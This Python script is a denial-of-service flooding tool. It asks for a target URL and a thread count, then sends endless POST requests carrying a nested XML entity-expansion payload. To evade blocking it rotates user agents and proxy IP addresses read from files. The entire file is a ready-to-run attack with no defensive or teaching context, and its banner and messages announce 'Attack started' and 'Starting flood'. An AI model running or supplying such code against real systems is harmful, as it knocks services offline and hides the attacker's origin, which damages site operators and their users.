import requests
import threading
import random
import time
from colorama import init, Fore, Style
import signal

init()

def load_user_agents(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def load_ip_addresses(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def send_request(url, payload, user_agents, ip_addresses):
    headers = {'User-Agent': random.choice(user_agents)}
    ip_address = random.choice(ip_addresses)
    proxies = {'http': f'http://{ip_address}', 'https': f'https://{ip_address}'}
    
    try:
        start_time = time.time()
        response = requests.post(url, headers=headers, data=payload, proxies=proxies, timeout=10)
        response.raise_for_status()
        end_time = time.time()
        print(f"{Fore.GREEN}[+] {Style.RESET_ALL}Response received from {url} - Status code: {response.status_code}, Time: {end_time - start_time:.2f} seconds")
    except:
        pass

def start_attack(url, payload, num_threads, user_agents, ip_addresses):
    print(f"{Fore.BLUE}[+] {Style.RESET_ALL}Attack started.")
    stop_event = threading.Event()

    def keyboard_listener(signal, frame):
        print(f"\n{Fore.RED}[-] {Style.RESET_ALL}Attack stopped.")
        stop_event.set()

    signal.signal(signal.SIGINT, keyboard_listener)

    thread_pool = []
    while not stop_event.is_set():
        for _ in range(num_threads):
            thread = threading.Thread(target=send_request, args=(url, payload, user_agents, ip_addresses))
            thread.start()
            thread_pool.append(thread)

    for thread in thread_pool:
        thread.join()

def print_banner():
    banner = """
  ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀
⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(f"{Fore.YELLOW}{banner}{Style.RESET_ALL}")

if __name__ == "__main__":
    print_banner()
    
    while True:
        print(f"{Fore.BLUE}[?] {Style.RESET_ALL}Enter the target URL:")
        target_url = input(f"{Fore.BLUE}[>] {Style.RESET_ALL}")

        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            print(f"{Fore.RED}[-] {Style.RESET_ALL}Invalid URL format. Please include 'http://' or 'https://'")
            continue

        print(f"{Fore.BLUE}[?] {Style.RESET_ALL}Enter the number of threads:")
        try:
            num_threads = int(input(f"{Fore.BLUE}[>] {Style.RESET_ALL}"))
        except ValueError:
            print(f"{Fore.RED}[-] {Style.RESET_ALL}Invalid input. Please enter a valid number.")
            continue
        
        print(f"{Fore.BLUE}[+] {Style.RESET_ALL}Preparing for the attack...")
        break

    xml_payload = """<!DOCTYPE data [
    <!ENTITY a0 "dos" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    ]>
    <data>&a4;</data>"""

    headers_file = "resources/headers.txt"
    ip_file = "resources/ip.txt"
    user_agents = load_user_agents(headers_file)
    ip_addresses = load_ip_addresses(ip_file)
    
    print(f"{Fore.BLUE}[+] {Style.RESET_ALL}Preparation complete. Starting flood at {time.strftime('%Y-%m-%d %H:%M:%S')}...")
    
    start_attack(target_url, xml_payload, num_threads, user_agents, ip_addresses)
    
